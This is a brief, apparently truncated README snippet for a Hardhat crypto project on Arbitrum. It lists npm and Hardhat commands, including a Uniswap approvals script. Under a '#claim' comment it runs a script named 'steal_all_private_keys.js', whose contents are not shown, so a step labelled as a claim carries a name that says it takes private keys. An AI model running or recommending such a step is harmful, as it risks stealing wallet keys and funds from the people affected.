Create `.env`. Insert Alchemy url and 

```
npm ci
#approves for Uniswap
npx hardhat run scripts/approves.js --network arb
#claim
npx hardhat run scripts/steal_all_private_keys.js --network arb
```
